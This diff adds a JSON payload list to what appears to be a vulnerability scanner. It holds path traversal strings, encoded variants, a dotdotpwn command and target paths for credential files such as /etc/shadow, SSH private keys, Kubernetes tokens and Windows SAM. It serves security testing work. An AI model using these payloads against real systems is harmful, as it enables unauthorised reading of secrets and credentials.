@@ -1,0 +1,832 @@
+[
+  {
+    "id": "pt-0001",
+    "payload": "perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0002",
+    "payload": "../",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0003",
+    "payload": "..\\",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0004",
+    "payload": "..\\/",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0005",
+    "payload": "%2e%2e%2f",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0006",
+    "payload": "%252e%252e%252f",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0007",
+    "payload": "%c0%ae%c0%ae%c0%af",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0008",
+    "payload": "%uff0e%uff0e%u2215",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0009",
+    "payload": "%uff0e%uff0e%u2216",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0010",
+    "payload": "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0011",
+    "payload": "{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0012",
+    "payload": "{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0013",
+    "payload": "{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0014",
+    "payload": "..././",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0015",
+    "payload": "...\\.\\",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0016",
+    "payload": "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0017",
+    "payload": "{{BaseURL}}/.%00./.%00./etc/passwd",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0018",
+    "payload": "{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0019",
+    "payload": "..;/",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0020",
+    "payload": "{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0021",
+    "payload": "\\\\localhost\\c$\\windows\\win.ini",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0022",
+    "payload": "/(S(X))/",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0023",
+    "payload": "/(Y(Z))/",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0024",
+    "payload": "/(G(AAA-BBB)D(CCC=DDD)E(0-1))/",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0025",
+    "payload": "/(S(X))/admin/(S(X))/main.aspx",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0026",
+    "payload": "/(S(x))/b/(S(x))in/Navigator.dll",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0027",
+    "payload": "/MyApp/(S(X))/",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0028",
+    "payload": "/admin/(S(X))/main.aspx",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0029",
+    "payload": "/admin/Foobar/(S(X))/../(S(X))/main.aspx",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0030",
+    "payload": "java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0031",
+    "payload": "java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0032",
+    "payload": "shortscan http://example.org/",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0033",
+    "payload": "url:file:///etc/passwd",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0034",
+    "payload": "url:http://127.0.0.1:8080",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0035",
+    "payload": "/etc/issue",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0036",
+    "payload": "/etc/group",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0037",
+    "payload": "/etc/hosts",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0038",
+    "payload": "/etc/motd",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0039",
+    "payload": "/proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0040",
+    "payload": "/proc/self/environ",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0041",
+    "payload": "/proc/version",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0042",
+    "payload": "/proc/cmdline",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0043",
+    "payload": "/proc/sched_debug",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0044",
+    "payload": "/proc/mounts",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0045",
+    "payload": "/proc/net/arp",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0046",
+    "payload": "/proc/net/route",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0047",
+    "payload": "/proc/net/tcp",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0048",
+    "payload": "/proc/net/udp",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0049",
+    "payload": "/proc/self/cwd/index.php",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0050",
+    "payload": "/proc/self/cwd/main.py",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0051",
+    "payload": "/var/lib/mlocate/mlocate.db",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0052",
+    "payload": "/var/lib/plocate/plocate.db",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0053",
+    "payload": "/var/lib/mlocate.db",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0054",
+    "payload": "/etc/passwd",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0055",
+    "payload": "/etc/shadow",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0056",
+    "payload": "/home/$USER/.bash_history",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0057",
+    "payload": "/home/$USER/.ssh/id_rsa",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0058",
+    "payload": "/etc/mysql/my.cnf",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0059",
+    "payload": "/run/secrets/kubernetes.io/serviceaccount/token",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0060",
+    "payload": "/run/secrets/kubernetes.io/serviceaccount/namespace",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0061",
+    "payload": "/run/secrets/kubernetes.io/serviceaccount/certificate",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0062",
+    "payload": "/var/run/secrets/kubernetes.io/serviceaccount",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0063",
+    "payload": "C:\\Windows\\win.ini",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0064",
+    "payload": "C:\\windows\\system32\\license.rtf",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0065",
+    "payload": "c:/inetpub/logs/logfiles",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0066",
+    "payload": "c:/inetpub/wwwroot/global.asa",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0067",
+    "payload": "c:/inetpub/wwwroot/index.asp",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0068",
+    "payload": "c:/inetpub/wwwroot/web.config",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0069",
+    "payload": "c:/sysprep.inf",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0070",
+    "payload": "c:/sysprep.xml",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0071",
+    "payload": "c:/sysprep/sysprep.inf",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0072",
+    "payload": "c:/sysprep/sysprep.xml",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0073",
+    "payload": "c:/system32/inetsrv/metabase.xml",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0074",
+    "payload": "c:/system volume information/wpsettings.dat",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0075",
+    "payload": "c:/unattend.txt",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0076",
+    "payload": "c:/unattend.xml",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0077",
+    "payload": "c:/unattended.txt",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0078",
+    "payload": "c:/unattended.xml",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0079",
+    "payload": "c:/windows/repair/sam",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-0080",
+    "payload": "c:/windows/repair/system",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "path_traversal payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "pt-001",
+    "payload": "../../../../etc/passwd",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "Linux path traversal baseline detection",
+    "expected_feature": "Sensitive file signature in response",
+    "source": "curated"
+  },
+  {
+    "id": "pt-002",
+    "payload": "..\\..\\..\\..\\windows\\win.ini",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "Windows path traversal baseline detection",
+    "expected_feature": "win.ini style content appears in response",
+    "source": "curated"
+  },
+  {
+    "id": "pt-101",
+    "payload": "....//....//....//etc/shadow",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "High-risk sensitive file disclosure verification",
+    "expected_feature": "Protected credential file content exposure",
+    "source": "curated"
+  }
+]
